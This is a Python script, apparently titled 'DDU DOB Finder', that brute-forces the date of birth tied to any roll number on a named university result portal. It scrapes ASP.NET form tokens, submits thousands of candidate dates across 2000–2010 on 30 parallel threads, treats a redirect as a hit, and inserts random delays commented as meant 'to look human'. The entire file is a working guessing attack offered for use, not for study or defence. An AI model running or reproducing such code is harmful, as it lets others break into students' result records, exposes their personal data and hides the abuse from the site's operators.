import requests
from datetime import datetime, timedelta
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
from tqdm import tqdm

# Retry wrapper
def safe_request(method, *args, **kwargs):
    for attempt in range(3):  # Retry up to 3 times
        try:
            return method(*args, **kwargs)
        except requests.exceptions.RequestException:
            time.sleep(random.uniform(0.5, 1.5))  # Random wait before retry
    return None

def try_date(session, roll_no, semester, date_of_birth):
    url = "https://ddugorakhpur.com/result2023/searchresult_new.aspx"

    try:
        initial_response = safe_request(session.get, url, timeout=10)
        if not initial_response:
            return False
        
        viewstate = re.search(r'id="__VIEWSTATE" value="([^"]+)"', initial_response.text)
        eventvalidation = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', initial_response.text)
        viewstategenerator = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', initial_response.text)

        if not (viewstate and eventvalidation and viewstategenerator):
            return False

        form_data = {
            "__VIEWSTATE": viewstate.group(1),
            "__VIEWSTATEGENERATOR": viewstategenerator.group(1),
            "__EVENTVALIDATION": eventvalidation.group(1),
            "ddlsem": semester,
            "txtRollno": roll_no,
            "txtDob": date_of_birth,
            "btnSearch": "Search Result"
        }

        response = safe_request(session.post, url, data=form_data, allow_redirects=False, timeout=10)
        if response and response.status_code == 302:
            return True

    except Exception:
        pass

    return False

def generate_dates_interleaved(years):
    """Generate dates across multiple years in an interleaved way"""
    start_dates = {year: datetime(year, 1, 1) for year in years}
    end_dates = {year: datetime(year, 12, 31) for year in years}
    current_dates = start_dates.copy()
    dates = []

    while True:
        all_finished = True
        for year in years:
            if current_dates[year] <= end_dates[year]:
                dates.append(current_dates[year].strftime('%Y-%m-%d'))
                current_dates[year] += timedelta(days=1)
                all_finished = False
        if all_finished:
            break

    return dates

def smart_runner(dates, roll_no, semester, max_workers=30):
    session = requests.Session()

    found_date = None

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_date = {executor.submit(try_date, session, roll_no, semester, date): date for date in dates}
        
        with tqdm(total=len(future_to_date), desc=f"Trying Dates (Roll {roll_no})", ncols=90) as pbar:
            for future in as_completed(future_to_date):
                date = future_to_date[future]
                try:
                    result = future.result()
                    if result:
                        print(f"\n🎯 Found correct DOB for Roll {roll_no}: {date}")
                        found_date = date
                        executor.shutdown(wait=False, cancel_futures=True)
                        return found_date
                except Exception:
                    pass

                pbar.update(1)
                time.sleep(random.uniform(0.05, 0.15))  # tiny random delay to look human

    return found_date

def grouped_search(roll_no, semester):
    priority_groups = [
        [2006, 2007, 2008],            # First group
        [2003, 2004, 2005],            # Second group
        [2000, 2001, 2002, 2009, 2010] # Third group
    ]

    for group_num, years in enumerate(priority_groups, start=1):
        print(f"\n🚀 Starting Group {group_num}: Years {years}")
        
        interleaved_dates = generate_dates_interleaved(years)
        found = smart_runner(interleaved_dates, roll_no, semester)
        if found:
            return found

    print("\n❌ No matching DOB found in any group.")
    return None

def main():
    print("🔥 DDU DOB Finder (Fast + Secure + Progress Bar Version)")
    print("--------------------------------------------------------")
    
    roll_no = input("Enter Roll Number: ").strip()
    semester = input("Enter Semester (1-8): ").strip()

    grouped_search(roll_no, semester)

if __name__ == "__main__":
    main()
